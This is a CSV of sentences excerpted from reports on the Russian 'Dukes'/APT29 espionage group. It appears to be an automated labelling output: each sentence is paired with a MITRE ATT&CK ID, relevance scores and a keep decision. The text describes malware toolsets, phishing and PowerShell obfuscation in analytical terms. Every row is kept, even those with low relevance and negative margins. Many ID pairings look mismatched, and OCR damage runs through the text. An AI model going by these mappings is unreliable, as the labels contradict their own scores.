"query","candidate","type","p_relevant","p_irrelevant","adj_score","margin","keep","decision"
"take a look replies Sep 2015: The Dukes up the ante The end of January 2015 saw the start of the most high- volume Duke campaign seen thus far, with thousands of recipients being sent spear-phishing emails that contained links to compromised websites hosting CozyDuke.","T1585.002","T","0.906659","0.093341","0.906659","0.813318","True","keep"
"HammerDuke SeaDuke OnionDuke CozyDuke CosmicDuke GeminiDuke PinchDuke MiniDuke ItaDuke Duqu 'duke' 'duke' The Dukes THE DUKES 7 YEARS OF RUSSIAN CYBERESPIONAGE F-Secure Whitepaper September 2015 take a look replies Sep 2015: The Dukes up the ante The end of January 2015 saw the start of the most high- volume Duke campaign seen thus far, with thousands of recipients being sent spear-phishing emails that contained links to compromised websites hosting CozyDuke.","S0054","S","0.89355","0.10645","0.89355","0.7871","True","keep"
"The counter to that argument however is that the value of stolen credentials from users in the countries with the highest percentage of OnionDuke bots (Mongolia and India) are among the lowest on underground markets.","T0859","T","0.96822","0.03178","0.96822","0.93644","True","keep"
"One theory is that the botnets were a criminal side business for the Dukes group. We have since been able to identify at least two separate OnionDuke botnets.","S0183","S","0.971641","0.028359","0.971641","0.943282","True","keep"
"While one of these modules gathers system information and another attempts to steal the victim's usernames and passwords, as one would expect from a malware used for a targeted attack, the other two known OnionDuke modules are quite the opposite; one is designed for use in DoS attacks and the other for posting predetermined messages to the Russian VKontakte social media site.","S0183","S","0.96869","0.03131","0.96869","0.93738","True","keep"
"Executing the modified applications obtained this way would result in the victim being infected with unidentified malware.","T1027.005","T","0.914954","0.085046","0.914954","0.829908","True","keep"
"OnionDuke gets caught using a malicious Tor node On the 23 rd of October 2014, Leviathan Security Group published a blog post describing a malicious Tor exit node they had found.","S0428","S","0.968857","0.031143","0.968857","0.937714","True","keep"
"Some of the CozyDuke spear-phishing emails from early July posed as e-fax arrival notifications, a popular theme for spam emails, and used the same 'US letter fax test page' decoy document that was used a year later by CloudDuke.","T1071.003","T","0.591731","0.408269","0.591731","0.183462","True","keep"
"This campaign, like later CozyDuke campaigns, began with spear-phishing emails that tried to impersonate commonly seen spam emails.","T1585.002","T","0.582644","0.417356","0.582644","0.165288","True","keep"
"As will become evident in this report, this was not a one-off case but a recurring theme with the Dukes, in that they would rather continue with their operations as planned than retreat from operating under the spotlight. Based on samples of Duke malware from 2012, the Dukes do appear to have continued actively using and developing all of their tools. Based on this, we do not believe that the Dukes are replacing their covert and targeted campaigns with the overt and opportunistic CozyDuke and CloudDuke style of campaigns. Based on what we currently know about the targets chosen by the Dukes over the past 7 years, they appear to have consistently targeted entities that deal with foreign policy and security policy matters. But are the Dukes a team or a department inside a government agency? Campaign identifiers from 2009 also reveal that by that time, the Dukes were already actively interested in political matters related to the United States (US) and the North Atlantic Treaty Organization (NATO), as they ran campaigns targeting (among other organizations) a US-based foreign policy think tank, another set of campaigns related to a NATO exercise held in Europe, and a third set apparently targeting what was then known as the Georgian 'Information Centre on NATO'. Concurrently with the alterations to CosmicDuke, the Dukes were also hard at work modifying their trusted loader. Continuing expansion of the Dukes arsenal By 2011, the Dukes had already developed at least 3 distinct malware toolsets, including a plethora of supporting components such as loaders and persistence modules. During the rest of 2014 and the spring of 2015, the Dukes continued making similar evasionfocused modifications to CosmicDuke, as well as experimenting with ways to obfuscate the loader. EXECUTIVE SUMMARY The Dukes are a well-resourced, highly dedicated and organized cyberespionage group that we believe has been working for the Russian Federation since at least 2008 to collect intelligence in support of foreign and security policy decision-making. Even though the Dukes appear to have targeted governments all over the world, we are unaware of them ever targeting the Russian government. Finally, it is worth noting that the Dukes are known to sometimes re-infect a victim of one of their malware tools with another one of their tools. Firstly, the Dukes may have been confident enough in their own abilities (and in the slowness of their opponents to react to new threats) that they did not care if their targets may already be on the lookout for anyone exploiting these vulnerabilities. For the victims deemed interesting enough, the Dukes would then deploy a different toolset. Further reading FireEye; HAMMERTOSS: Stealthy Tactics Define a Russian Cyber Threat Group; published July 2015; https://www2.fireeye.com/rs/848-DID-242/ images/rpt-apt29-hammertoss.pdf * *APT29 is the name used by FireEye to identify the cyberespionagegroup we refer to as the Dukes. INFECTION VECTORS The Dukes primarily use spear-phishing emails when attempting to infect victims with their malware. If however by that time the Dukes are already operating within the victim's network, using an another toolset with different IOCs, then it is reasonable to assume that it will take much longer for the victim organization to notice the infiltration. If the compromised target is discovered to be of value, the Dukes will quickly switch the toolset used and move to using stealthier tactics focused on persistent compromise and long-term intelligence gathering. In one of their more intriguing cases, the Dukes have appeared to also target entities involved in the trafficking of illegal drugs. In some cases, the Dukes appear to have used previously compromised victims to send new spear-phishing emails to other targets. In the most extreme case, the Dukes continued with their July 2015 CloudDuke campaign even after their activity had been outed by multiple security vendors. In this case, the Dukes first attempted to infect large numbers of potential targets with CozyDuke (and in a more obvious manner than previously seen). Instead, we feel the targeting of drug dealers was a new task for a subset of the Dukes group, possibly due to the drug trade's relevance to security policy issues. It is therefore important to note that, contrary to what might be assumed, we have actually observed a drop instead of an increase in Ukraine-related campaigns from the Dukes following the country's political crisis. John Kasai of Klagenfurt, Austria During 2011, the Dukes appear to have significantly expanded both their arsenal of malware toolsets and their C&C infrastructure. Much like the MiniDuke expose in February 2013, the Dukes again appeared to prioritize continuing operations over staying hidden. One might argue that since this took place after the exploits were publicly mentioned, the Dukes simply copied them. Right - Details for the domain were later changed, providing a small glimpse of the Dukes' sense of humor. The Dukes actively targeted Ukraine before the crisis, at a time when Russia was still weighing her options, but once Russia moved from diplomacy to direct action, Ukraine was no longer relevant to the Dukes in the same way. The Dukes continued the expansion of their arsenal in 2011 with the addition of two more toolsets: MiniDuke and CozyDuke. The Dukes have consistently operated large-scale campaigns against high-profile targets while concurrently engaging in smaller, more targeted campaigns with apparent coordination and no evidence of unintentional overlap or operational clashes. The Dukes primarily target Western governments and related organizations, such as government ministries and agencies, political think tanks, and governmental subcontractors. The Dukes rapidly react to research being published about their toolsets and operations. The earliest activity we have been able to definitively attribute to the Dukes are two PinchDuke campaigns from November 2008. The only instances which we are aware of where the Dukes did not use spear-phishing as the initial infection vector is with certain OnionDuke variants. The story of the Dukes, as it is currently known, begins with a malware toolset that we call PinchDuke. This does however still rule out the possibility that the Dukes simply obtained copies of the exploit binaries described by FireEye and repurposed them. This indication that the Dukes planned to use an arsenal of 5 malware toolsets in parallel suggests that they were operating with both significant resources and capacity. This paper has already stated that we believe the Dukes to be a Russian state-sponsored cyberespionage operation. This supports our analysis that the overarching theme in the Dukes' targeting is the collection of intelligence to support diplomatic efforts. This whitepaper explores the tools - such as MiniDuke, CosmicDuke, OnionDuke, CozyDuke, etc- of the Dukes, a well-resourced, highly dedicated and organized cyberespionage group that we believe has been working for the Russian Federation since at least 2008 to collect intelligence in support of foreign and security policy decision-making. To spread the toolset, the Dukes used a wrapper to combine OnionDuke with legitimate applications, created torrent files containing these trojanized applications, then uploaded them to websites hosting torrent files (image 4, above). We also believe the tasking to have been temporary, because we have not observed any further similar targeting from the Dukes after the spring of 2014. We therefore believe that the Dukes group simply failed to update the computer they were using to compile GeminiDuke samples, so that the timestamps seen in later samples still appear to follow the old definition of Moscow Standard Time.","T1637.001","T","0.967893","0.032107","0.967893","0.935786","True","keep"
"F-Secure's whitepaper [5] on CosmicDuke includes a timeline of the loader's usage, based on compilation timestamps.","T0852","T","0.923525","0.076475","0.923525","0.84705","True","keep"
"Much like the CosmicDuke toolset, the loader used by both MiniDuke and CosmicDuke had previously only undergone one major update (the Nemesis Gemina upgrade) since the first known samples from 2010.","S0177","S","0.966532","0.033469","0.966532","0.933063","True","keep"
"Another is a loader variant seen during the spring of 2010 in conjunction with both CosmicDuke and PinchDuke. Much like the CosmicDuke toolset, the loader used by both MiniDuke and CosmicDuke had previously only undergone one major update (the Nemesis Gemina upgrade) since the first known samples from 2010. The GeminiDuke infostealer has occasionally been wrapped with a loader that appears to be unique to GeminiDuke and has never been observed being used with any of the other Duke toolsets. The loader used by the sample purported to have been compiled on the 25 th of March 2010. These resulted in a loader version that would later become known as the 'Nemesis Gemina loader' due to PDB strings found in many of the samples. They could have ceased all use of CosmicDuke (at least until they had developed a new loader) or retired it entirely, since they still had other toolsets available. This neatly ties together many of the tools used by the Dukes group, as versions of this one loader have been used to load malware from three different Dukes-related toolsets - CosmicDuke, PinchDuke, and MiniDuke - over the course of five years. To avoid confusion however, we have decided to continue referring to the loader as the 'MiniDuke loader'. While the loader has often been used together with other MiniDuke components, it has also commonly been used in conjunction with CosmicDuke and PinchDuke.","T1645","T","0.923939","0.076061","0.923939","0.847878","True","keep"
"All MiniDuke components, from the loader and downloader to the backdoor, had been slightly updated and modified during the downtime.","S0471","S","0.939003","0.060997","0.939003","0.878006","True","keep"
"A shared supplier of malware would explain the overlap in tools, but it would not explain the significant overlap we have also observed in operational techniques related to command and control infrastructure.","TA0011","T","0.932125","0.067875","0.932125","0.86425","True","keep"
"Kaspersky Labs, who sometimes refer to CosmicDuke as 'Bot Gen Studio', speculated that 'one possibility is that 'Bot Gen Studio' is a malware platform also available as a so-called 'legal spyware' tool'; therefore, those using CosmicDuke to target drug dealers and those targeting governments are two separate entities [11] .","S0266","S","0.95259","0.04741","0.95259","0.90518","True","keep"
"Screenshot of a decoy document appearing to be an order for growth hormones, which was used in a CosmicDuke campaign in September 2013.","S0414","S","0.605028","0.394972","0.605028","0.210056","True","keep"
"This indication that the Dukes planned to use an arsenal of 5 malware toolsets in parallel suggests that they were operating with both significant resources and capacity.","S0018","S","0.9422","0.0578","0.9422","0.8844","True","keep"
"OnionDuke's development therefore could not have been simply a response to the outing of one of the other Duke malware, but was instead intended for use alongside the other toolsets.","S0070","S","0.930911","0.069089","0.930911","0.861822","True","keep"
"To spread the toolset, the Dukes used a wrapper to combine OnionDuke with legitimate applications, created torrent files containing these trojanized applications, then uploaded them to websites hosting torrent files (image 4, above).","T1608.001","T","0.894346","0.105654","0.894346","0.788692","True","keep"
"Specifically, the only known infection vector for HammerDuke is to be downloaded and executed by CozyDuke onto a victim that has already been compromised by that toolset. What makes OnionDuke especially curious is an infection vector it began using during the summer of 2013.","S1024","S","0.975907","0.024093","0.975907","0.951814","True","keep"
"In fact, we saw yet another Duke malware toolset, OnionDuke, appear first in 2013.","S0052","S","0.543186","0.456814","0.543186","0.0863719999999999","True","keep"
"As mentioned by Kaspersky, even though the exploits used for these MiniDuke campaigns were near-identical to those described by FireEye, there were nevertheless small differences.","S0113","S","0.504511","0.495489","0.504511","0.00902200000000003","True","keep"
"As mentioned by Kaspersky, even though the exploits used for these MiniDuke campaigns were near-identical to those described by FireEye, there were nevertheless small differences. Of these, the crucial one is the presence of PDB strings in the MiniDuke exploits. One might argue that since this took place after the exploits were publicly mentioned, the Dukes simply copied them.","S0084","S","0.92667","0.07333","0.92667","0.85334","True","keep"
"In fact, in 2009 a PinchDuke sample had been included in the malware set used by the AV-Test security product testing organization to perform anti-virus product comparison reviews.","S0396","S","0.958985","0.041015","0.958985","0.91797","True","keep"
"One of the Ukraine-themed decoy documents used during a MiniDuke campaign in February 2013.","S0689","S","0.922695","0.077305","0.922695","0.84539","True","keep"
"Finally, early CozyDuke versions also featured other elements that one would associate more with a traditional software development project than with malware.","S0046","S","0.791401","0.208599","0.791401","0.582802","True","keep"
"All of the 4 previously mentioned toolsets were written in a minimalistic style commonly seen with malware; MiniDuke even goes as far as having many components written in Assembly language.","S0177","S","0.974147","0.025853","0.974147","0.948294","True","keep"
"The first observed samples of the MiniDuke backdoor component are from May 2011.","S0031","S","0.972488","0.027512","0.972488","0.944976","True","keep"
"Continuing expansion of the Dukes arsenal By 2011, the Dukes had already developed at least 3 distinct malware toolsets, including a plethora of supporting components such as loaders and persistence modules. In previous cases, the group used their malware toolsets interchangeably, as either the initial or a later-stage toolset in a campaign.","S0052","S","0.974586","0.025414","0.974586","0.949172","True","keep"
"John Kasai of Klagenfurt, Austria During 2011, the Dukes appear to have significantly expanded both their arsenal of malware toolsets and their C&C infrastructure.","S0387","S","0.950322","0.049678","0.950322","0.900644","True","keep"
"This neatly ties together many of the tools used by the Dukes group, as versions of this one loader have been used to load malware from three different Dukes-related toolsets - CosmicDuke, PinchDuke, and MiniDuke - over the course of five years.","S0053","S","0.528427","0.471573","0.528427","0.056854","True","keep"
"In fact, we now know that before being used with either, the 'MiniDuke loader' was used to load PinchDuke. Like the 'MiniDuke loader', these 'John Kasai' domains also provide a common thread tying together much of the tools and infrastructure of the Dukes. Some hints about the history of the 'MiniDuke loader' were noted in the CosmicDuke whitepaper we published [5] in 2014, where we observed that the loader appeared to have been in use with CosmicDuke before it was used with MiniDuke. To avoid confusion however, we have decided to continue referring to the loader as the 'MiniDuke loader'.","S0177","S","0.810642","0.189358","0.810642","0.621284","True","keep"
"If the compromised target is discovered to be of value, the Dukes will quickly switch the toolset used and move to using stealthier tactics focused on persistent compromise and long-term intelligence gathering.","T1630.003","T","0.954118","0.045882","0.954118","0.908236","True","keep"
"Importantly, PinchDuke trojan samples always contain a notable text string, which we believe is used as a campaign identifier by the Dukes group to distinguish between multiple attack campaigns that are run in parallel. The first of these runs used the campaign identifier 'natoinfo_ge', an apparent reference to the www.natoinfo.ge website belonging to a Georgian political body that has since been renamed 'Information Centre on NATO and EU'. This belief is based on the observation that in all of the other PinchDuke samples we have analyzed, the date of the campaign identifier has been within a day of the compilation date.","T1655.001","T","0.972592","0.027408","0.972592","0.945184","True","keep"
"The earliest activity we have been able to definitively attribute to the Dukes are two PinchDuke campaigns from November 2008.","S0048","S","0.514929","0.485071","0.514929","0.029858","True","keep"
"As researchers continued discovering new toolsets that were created and used by the same group that had been operating MiniDuke, the new toolsets were also given 'Duke'-derived names, and thus the threat actor operating the toolsets started to be commonly referred to as 'the Dukes'. Both toolsets were originally spotted being deployed by CozyDuke to its victims.","S0023","S","0.876682","0.123318","0.876682","0.753364","True","keep"
"As we now know, by February 2013 the Dukes group had been operating MiniDuke and other toolsets for at least 4 and a half years. First known campaigns against the West Based on the campaign identifiers found in PinchDuke samples discovered from 2009, the targets of the Dukes group during that year included organizations such as the Ministry of Defense of Georgia and the ministries of foreign affairs of Turkey and Uganda. Hiding in the shadows We still know surprisingly few specifics about the Dukes group's activities during 2012.","S0550","S","0.950892","0.049108","0.950892","0.901784","True","keep"
"These campaigns utilized specially-crafted malicious Microsoft Word documents and PDF files, which were sent as e-mail attachments to various personnel in an attempt to infiltrate the targeted organizations.","T0863","T","0.938345","0.061655","0.938345","0.87669","True","keep"
"[2] (circa 2008, preserved by the Internet Archive Wayback Machine), which was referenced in 2008 PinchDuke sample.","S0048","S","0.430696","0.569304","0.430696","-0.138608","True","keep"
"Back then, CosmicDuke still lacked most of the credential-stealing functionality found in later samples.","TA0006","T","0.926064","0.073936","0.926064","0.852128","True","keep"
"We believe that during the spring of 2010, the credential and file stealing capabilities of PinchDuke were slowly ported to CosmicDuke, effectively making PinchDuke obsolete.","T1552.001","T","0.791346","0.208654","0.791346","0.582692","True","keep"
"+RC4/Base64 OPERATIONS Compromised website IDENTIFY SYSTEM INSTALL SEADUKE C&C SERVER #SEADUKE #COZYDUKE Symantec _ @threatintel www symantec com 1 Seaduke operation Although Seaduke was developed in Python, the overall framework bears a striking resemblance to Cozyduke in terms of operation. How Seaduke operates on the target network HOW SEADUKE OPERATES ON THE TARGET NETWORK ATTACKER CLOUD SERVICES Email exfiltration RAR 110 character password AES encrypted HIGH PROFILE GOVERNMENT NETWORK OPERATIONS INSTALL PAYLOAD C&C communications HTTP/HTTPS LATERAL MOVEMENT RC4/AES/Base64 IMPERSONATION (PASS THE TICKET) Seaduke (detected by Symantec as Trojan. Seaduke (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2015-031915-4935-99&tabid=2). Seaduke securely communicates with the C&C server over HTTP/HTTPS beneath layers of encoding (Base64) and encryption (RC4, AES). The Seaduke control infrastructure is essentially distinct, opening up the possibility of sub-teams concurrently exploiting the target network. Unlike Cozyduke, Seaduke operators upload 'task' !","S0142","S","0.954946","0.045054","0.954946","0.909892","True","keep"
"Impersonation using Kerberos pass-the-ticket attacks (Mimikatz PowerShell) Email extraction from the MS Exchange Server using compromised credentials Archiving sensitive information Data ex ! ltration via legitimate cloud services Secure !","S0156","S","0.96699","0.03301","0.96699","0.93398","True","keep"
"They have the ability to retrieve detailed bot/system information, update bot con !","T0865","T","0.949004","0.050996","0.949004","0.898008","True","keep"
"How Seaduke operates on the target network HOW SEADUKE OPERATES ON THE TARGET NETWORK ATTACKER CLOUD SERVICES Email exfiltration RAR 110 character password AES encrypted HIGH PROFILE GOVERNMENT NETWORK OPERATIONS INSTALL PAYLOAD C&C communications HTTP/HTTPS LATERAL MOVEMENT RC4/AES/Base64 IMPERSONATION (PASS THE TICKET)","T1590.006","T","0.894024","0.105976","0.894024","0.788048","True","keep"
"Seaduke securely communicates with the C&C server over HTTP/HTTPS beneath layers of encoding (Base64) and encryption (RC4, AES).","TA0101","T","0.97254","0.027459","0.97254","0.945081","True","keep"
"Miniduke (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2013-030119-2820-99http://www.symantec.com/security_response/writeup.jsp?docid=2013-0301192820-99) and the more elusive Trojan. Seaduke (detected by Symantec as Trojan.","S0051","S","0.137679","0.862321","0.137679","-0.724642","True","keep"
"The malware hides behind numerous layers of encryption and obfuscation and is capable of quietly stealing and ex !","T1406","T","0.946061","0.053939","0.946061","0.892122","True","keep"
"In the months that followed, the Duke group began to target victims with 'O $ ce Monkeys'- and 'eFax'-themed emails, booby-trapped with a Cozyduke payload. The Duke group has brought its operational capability to the next level. While the Duke group began to distribute Cozyduke in an increasingly aggressive manner, Seaduke installations were reserved only for select targets.","S0665","S","0.907957","0.092043","0.907957","0.815914","True","keep"
"+RC4/Base64 OPERATIONS Compromised website IDENTIFY SYSTEM INSTALL SEADUKE C&C SERVER #SEADUKE #COZYDUKE Symantec _ @threatintel www symantec com 1 Seaduke operation Although Seaduke was developed in Python, the overall framework bears a striking resemblance to Cozyduke in terms of operation. Cozer (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2015-030500-0430-99&tabid=2) (aka Cozyduke) was identi ! ne-tuned computer network exploitation (CNE) skills Although Cozyduke activity was ! rst infected with Cozyduke and, if the computer appears to be a target of interest, the operators will install Seaduke.","S0665","S","0.873403","0.126597","0.873403","0.746806","True","keep"
"rst infected with Cozyduke and, if the computer appears to be a target of interest, the operators will install Seaduke.","S0648","S","0.936987","0.063013","0.936987","0.873974","True","keep"
"It has a range of malware tools at its disposal, known as the Dukes, including Cozyduke (Trojan.","S0046","S","0.927276","0.072724","0.927276","0.854552","True","keep"
"Cozer (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2015-030500-0430-99&tabid=2)), Miniduke (Backdoor.Miniduke (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2013-030119-2820-99http://www.symantec.com/security_response/writeup.jsp?docid=2013-0301192820-99)) and Cosmicduke (Backdoor.","S0093","S","0.33707","0.66293","0.33707","-0.32586","True","keep"
"Cozer (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2015-030500-0430-99&tabid=2) (aka Cozyduke) was identi ! Cozer (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2015-030500-0430-99&tabid=2)), Miniduke (Backdoor.Miniduke (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2013-030119-2820-99http://www.symantec.com/security_response/writeup.jsp?docid=2013-0301192820-99)) and Cosmicduke (Backdoor.","S0046","S","0.743287","0.256713","0.743287","0.486574","True","keep"
"Miniduke (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2013-030119-2820-99http://www.symantec.com/security_response/writeup.jsp?docid=2013-0301192820-99) and the more elusive Trojan. Miniduke (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2013-030119-2820-99http://www.symantec.com/security_response/writeup.jsp?docid=2013-0301192820-99) onto a compromised network. Miniduke has been the group's tool of choice for a number of years in espionage operations predominantly targeting government and diplomatic entities in Eastern Europe and ex-Soviet states. The Miniduke payload In July of 2014, the group instructed Cozyduke-infected computers to install Backdoor. This deployment of Miniduke and the technical similarities with Cozyduke provided strong indicators as to who was behind the attacks.","S0023","S","0.893411","0.106589","0.893411","0.786822","True","keep"
"Seaduke (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2015-031915-4935-99&tabid=2).","S0053","S","0.371008","0.628992","0.371008","-0.257984","True","keep"
"Miniduke has been the group's tool of choice for a number of years in espionage operations predominantly targeting government and diplomatic entities in Eastern Europe and ex-Soviet states.","S0689","S","0.971922","0.028078","0.971922","0.943844","True","keep"
"Tinybaron (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2014-052717-4610-99&tabid=2) (aka Cosmicduke) samples, which Symantec also attributes to the Duke group.","S0665","S","0.879569","0.120431","0.879569","0.759138","True","keep"
"Tinybaron (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2014-052717-4610-99&tabid=2) (aka Cosmicduke) samples, which Symantec also attributes to the Duke group. Tinybaron (https://web.archive.org/web/20181008161626mp_/http://www.symantec.com/security_response/writeup.jsp? docid=2014-052717-4610-99&tabid=2)).","S0414","S","0.478496","0.521504","0.478496","-0.043008","True","keep"
"The Seaduke framework was designed to be highly con !","S1022","S","0.496133","0.503867","0.496133","-0.00773399999999996","True","keep"
"The communication protocol employed had many layers of encryption and obfuscation, using over 200 compromised web servers for command and control.","T1639","T","0.953019","0.046981","0.953019","0.906038","True","keep"
"The Seaduke control infrastructure is essentially distinct, opening up the possibility of sub-teams concurrently exploiting the target network.","T0869","T","0.971302","0.028698","0.971302","0.942604","True","keep"
"Upgrade PowerShell to new versions with enhanced logging features and monitor the logs to detect usage of PowerShell commands, which are often malware-related.","S0371","S","0.971871","0.028129","0.971871","0.943742","True","keep"
"Consider restricting access to sensitive password hashes by using a shadow password file or equivalent on UNIX systems.","T1003.008","T","0.969431","0.03057","0.969431","0.938861","True","keep"
"Phishing and Spearphishing Implement a Sender Policy Framework (SPF) record for your organization's Domain Name System (DNS) zone file to minimize risks relating to the receipt of spoofed messages.","T1030","T","0.86248","0.13752","0.86248","0.72496","True","keep"
"Take steps to harden both Web applications and the servers hosting them to reduce the risk of network intrusion via this vector.","T1030","T","0.971974","0.028026","0.971974","0.943948","True","keep"
"Figure 1: The tactics and techniques used by APT29 and APT 28 to conduct cyber intrusions against target systems ADVERSARY SPACE NEUTRAL SPACE VICTIM SPACE In the course of that campaign, APT29 successfully compromised a U.S. political party. Two separate Russian espionage groups Pushes Establishes encrypted communication with APT29 TRADECRAFT Powershell comand Scheduled execution Implant Unique encryption keys Leverages APT29 Silently exfiltrates data TARGETED SYSTEMS Operational Infrastructure Deploys Installs onto X-Agent Leverages APT28 TRADECRAFT","S0139","S","0.979439","0.020561","0.979439","0.958878","True","keep"
"Figure 1: The tactics and techniques used by APT29 and APT 28 to conduct cyber intrusions against target systems ADVERSARY SPACE NEUTRAL SPACE VICTIM SPACE","TA0041","T","0.873697","0.126303","0.873697","0.747394","True","keep"
"Using the harvested credentials, APT28 was able to gain access and steal content, likely leading to the exfiltration of information from multiple senior party members.","TA0006","T","0.936092","0.063908","0.936092","0.872184","True","keep"
"When reviewing network perimeter logs for the IP addresses, organizations may find numerous instances of these IPs attempting to connect to their systems.","T1018","T","0.96957","0.03043","0.96957","0.93914","True","keep"
"Injection Flaws are broad web application attack techniques that attempt to send commands to a browser, database, or other system, allowing a regular user to control behavior.","T1674","T","0.961682","0.038318","0.961682","0.923364","True","keep"
"For example, the use of 'FromBase'+0x40+'String', in place of FromBase64String, the PowerShell command used to decode base64. The decoded command consisted of additional PowerShell that read the content of ds7002.lnk from o $ set 0x5e2be to o $ set 0x623b6, base64 decoded the extracted content, and executed it as additional PowerShell content.","S0371","S","0.691354","0.308646","0.691354","0.382708","True","keep"
"It has also been over a year since we have conclusively identi # ed APT29 activity, which raises questions about the timing and the similarities of the activity a & er such a long interlude. activity targeted some of the same recipients of this email campaign, and APT29 has leveraged large waves of emails in previous campaigns. new activity (le "" ) and old activity (right) Figure 8: Shared string obfuscation logic: new LNK activity (le "" ) and old VERNALDROP activity (right) Indicators","S0394","S","0.941919","0.058081","0.941919","0.883838","True","keep"
"The sample was con # gured to use a malleable C2 pro # le for its network communications.","S0529","S","0.733105","0.266895","0.733105","0.46621","True","keep"
"For example, the use of 'FromBase'+0x40+'String', in place of FromBase64String, the PowerShell command used to decode base64.","T1623","T","0.819497","0.180503","0.819497","0.638994","True","keep"
"For network defenders, whether or not this activity was conducted by APT29 should be secondary to properly investigating the full scope of the intrusion, which is of critical impo "" ance if the elusive and deceptive APT29 operators indeed had access to your environment. It has also been over a year since we have conclusively identi # ed APT29 activity, which raises questions about the timing and the similarities of the activity a & er such a long interlude.","S0674","S","0.982882","0.017118","0.982882","0.965764","True","keep"
"Notable di $ erences include the use of Cobalt Strike, rather than custom malware; however, many espionage actors do use publicly and commercially available frameworks for reasons such as plausible deniability.","TA0011","T","0.976602","0.023398","0.976602","0.953204","True","keep"
"The sho "" cut # le was cra & ed to execute a PowerShell command that read, decoded, and executed additional code from within the sho "" cut # le.","S1119","S","0.629642","0.370358","0.629642","0.259284","True","keep"
"Additional overlap was observed in the targeting and tactics employed in the phishing campaigns responsible for distributing these LNK # le.","TA0042","T","0.628989","0.371011","0.628989","0.257978","True","keep"
"For network defenders, whether or not this activity was conducted by APT29 should be secondary to properly investigating the full scope of the intrusion, which is of critical impo "" ance if the elusive and deceptive APT29 operators indeed had access to your environment.","T1630.003","T","0.922833","0.077167","0.922833","0.845666","True","keep"
"Technical Details Phishing Emails were sent from DOSOneDriveNoti # cations-svCT- Mailboxe36625aaa85747214aa50342836a2315aaa36928202aa46271691a8255aaa 15382822aa25821925a0245@no "" hshorehealthgm[.]org with the subject Stevenson, Susan N shared ""TP18-DS7002 (UNCLASSIFIED)"" with you.","T1566.001","T","0.249856","0.750144","0.249856","-0.500288","True","keep"
"This combined with their use of steganography to hide their backdoor within PNG files that are downloaded remotely and loaded in memory only or via alternate data streams (ADS) is quite novel in its approach.","T1630.003","T","0.966283","0.033717","0.966283","0.932566","True","keep"
"The group's anti-VM macros and PowerShell scripts appear to have drastically reduced the number of sandboxes and bots that the group has to deal with on their command and control infrastructure.","T1564.010","T","0.953153","0.046847","0.953153","0.906306","True","keep"
"They have had tremendous success evading anti-virus and anti-malware solutions at both the desktop and mail gateway levels.","S0665","S","0.952842","0.047158","0.952842","0.905684","True","keep"
"Volexity has dubbed this backdoor PowerDuke . Volexity suspects the feature set that has been built into PowerDuke is an extension of their anti-VM capabilities in the initial dropper files. shinfo shdel shadd setpng conn setsrv Volexity may update this post following further PowerDuke analysis.","S0145","S","0.97741","0.02259","0.97741","0.95482","True","keep"
"Volexity suspects the feature set that has been built into PowerDuke is an extension of their anti-VM capabilities in the initial dropper files.","S0177","S","0.972308","0.027692","0.972308","0.944616","True","keep"
"The PowerDuke Backdoor The PowerDuke backdoor boasts a pretty extensive list of features that allow the Dukes to examine and control a system.","S0223","S","0.965498","0.034502","0.965498","0.930996","True","keep"
"48803a7d988f9f9f43f Notes: Microsoft shortcut file with embedded PowerShell, PowerDuke backdoor (hqwhbr.lck), and clean decoy document.","S0371","S","0.725301","0.274699","0.725301","0.450602","True","keep"
